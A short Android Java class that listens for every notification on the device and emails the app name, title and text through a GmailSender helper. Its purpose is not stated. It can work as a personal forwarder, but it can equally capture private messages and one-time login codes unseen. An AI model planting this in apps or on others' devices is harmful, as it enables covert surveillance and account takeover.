public class NotificationService extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String app = sbn.getPackageName();
        String title = sbn.getNotification().extras.getString("android.title");
        CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");

        String message = "App: " + app + "\nTitle: " + title + "\nText: " + text;

        GmailSender.sendMail("Notification Received", message);
    }
}
